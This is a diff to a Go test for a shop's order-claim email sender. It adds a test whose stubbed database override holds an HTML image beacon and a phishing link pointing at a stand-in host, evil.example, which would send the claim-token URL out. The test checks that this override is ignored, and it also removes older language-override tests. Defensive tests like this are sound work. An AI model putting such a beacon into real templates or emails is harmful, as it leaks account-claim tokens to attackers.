@@ -12,7 +12,6 @@ import (
 	storeidentity "github.com/akarso/shopanda/internal/application/storeidentity"
 	"github.com/akarso/shopanda/internal/domain/mail"
 	"github.com/akarso/shopanda/internal/domain/store"
-	"github.com/akarso/shopanda/internal/domain/translation"
 	"github.com/akarso/shopanda/internal/platform/logger"
 )
 
@@ -174,13 +173,13 @@ type claimOverrideStub struct {
 }
 
 func (o claimOverrideStub) Get(_ context.Context, storeID, name, locale string) (string, string, error) {
-	if storeID != "s1" || name != "order_claim" || locale != "de" {
+	if storeID != "s1" || name != "order_claim" {
 		return "", "", mail.ErrTemplateNotFound
 	}
 	return o.subject, o.body, nil
 }
 
-func TestStorefrontOrderClaimEmailer_DBOverrideOmitsEnglishText(t *testing.T) {
+func TestStorefrontOrderClaimEmailer_IgnoresDBOverrideBeacon(t *testing.T) {
 	tmpl, lr := loadClaimTemplates(t)
 	stub := &claimMailerStub{}
 	emailer := storefrontOrderClaimEmailer{
@@ -190,85 +189,29 @@ func TestStorefrontOrderClaimEmailer_DBOverrideOmitsEnglishText(t *testing.T) {
 		templates: tmpl,
 		layout:    lr,
 		overrides: claimOverrideStub{
-			subject: "Bestellung beanspruchen",
-			body:    "<p>de-claim-{{.Data.ClaimURL}}</p>",
+			subject: "Hijacked subject",
+			body: `<img src="https://evil.example/c?u={{.Data.ClaimURL}}">` +
+				`<a href="https://evil.example/claim">Claim your order</a>` +
+				`<p>{{.Data.ClaimURL}}</p>`,
 		},
 		resolve: func(context.Context) (string, string, error) {
-			return "s1", "en", nil
+			return "s1", "de", nil
 		},
 		tokenTTL: 30 * time.Minute,
 	}
-	ctx := translation.WithLanguage(context.Background(), "de")
-	if err := emailer.SendClaimEmail(ctx, "guest@example.com", "tok-de"); err != nil {
+	if err := emailer.SendClaimEmail(context.Background(), "guest@example.com", "tok-de"); err != nil {
 		t.Fatalf("SendClaimEmail: %v", err)
 	}
-	if stub.last.Subject != "Bestellung beanspruchen" {
-		t.Fatalf("subject = %q", stub.last.Subject)
+	if stub.last.Subject != "Claim your guest order" {
+		t.Fatalf("subject = %q, want file template (order_claim not overridable)", stub.last.Subject)
 	}
-	if !strings.Contains(stub.last.Body, "de-claim-") || !strings.Contains(stub.last.Body, "claim_token=tok-de") {
-		t.Fatalf("body = %s", stub.last.Body)
+	if strings.Contains(stub.last.Body, "evil.example") {
+		t.Fatalf("DB beacon body must not send: %s", stub.last.Body)
 	}
-	wantLink := "https://shop.example/account/orders/claim?claim_token=tok-de"
-	if stub.last.Text != wantLink+"\n" {
-		t.Fatalf("override plain text = %q, want exact claim URL", stub.last.Text)
+	if !strings.Contains(stub.last.Body, `href="https://shop.example/account/orders/claim?claim_token=tok-de"`) {
+		t.Fatalf("body missing file claim href: %s", stub.last.Body)
 	}
-	if strings.Contains(stub.last.Text, "Use the link below") {
-		t.Fatalf("override must not attach English instructions: %q", stub.last.Text)
-	}
-}
-
-func TestStorefrontOrderClaimEmailer_RequestLanguageBeatsStore(t *testing.T) {
-	tmpl, lr := loadClaimTemplates(t)
-	stub := &claimMailerStub{}
-	emailer := storefrontOrderClaimEmailer{
-		mailer:    stub,
-		claimURL:  "https://shop.example/account/orders/claim",
-		templates: tmpl,
-		layout:    lr,
-		overrides: claimOverrideStub{
-			subject: "DE subject",
-			body:    `<p>de-{{.Data.ClaimURL}}</p>`,
-		},
-		resolve: func(context.Context) (string, string, error) {
-			return "s1", "en", nil
-		},
-		tokenTTL: time.Minute,
-	}
-	ctx := translation.WithLanguage(context.Background(), "de-DE")
-	if err := emailer.SendClaimEmail(ctx, "guest@example.com", "tok"); err != nil {
-		t.Fatalf("SendClaimEmail: %v", err)
-	}
-	if stub.last.Subject != "DE subject" {
-		t.Fatalf("subject = %q, want request-language de row", stub.last.Subject)
-	}
-	if !strings.Contains(stub.last.Body, "claim_token=tok") {
-		t.Fatalf("body missing claim token: %s", stub.last.Body)
-	}
-}
-
-func TestStorefrontOrderClaimEmailer_OverrideMissingClaimURLFails(t *testing.T) {
-	tmpl, lr := loadClaimTemplates(t)
-	stub := &claimMailerStub{}
-	emailer := storefrontOrderClaimEmailer{
-		mailer:    stub,
-		claimURL:  "https://shop.example/account/orders/claim",
-		templates: tmpl,
-		layout:    lr,
-		overrides: claimOverrideStub{
-			subject: "DE subject",
-			body:    "<p>de-only-no-link</p>",
-		},
-		resolve: func(context.Context) (string, string, error) {
-			return "s1", "en", nil
-		},
-		tokenTTL: time.Minute,
-	}
-	ctx := translation.WithLanguage(context.Background(), "de")
-	err := emailer.SendClaimEmail(ctx, "guest@example.com", "tok")
-	if err == nil || !strings.Contains(err.Error(), "missing claim URL") {
-		t.Fatalf("err = %v, want missing claim URL", err)
-	}
-	if stub.last.To != "" {
-		t.Fatalf("must not send when body omits claim URL, got To=%q", stub.last.To)
+	if !strings.Contains(stub.last.Text, "claim_token=tok-de") || !strings.Contains(stub.last.Text, "Use the link below") {
+		t.Fatalf("plain text = %q", stub.last.Text)
 	}
 }
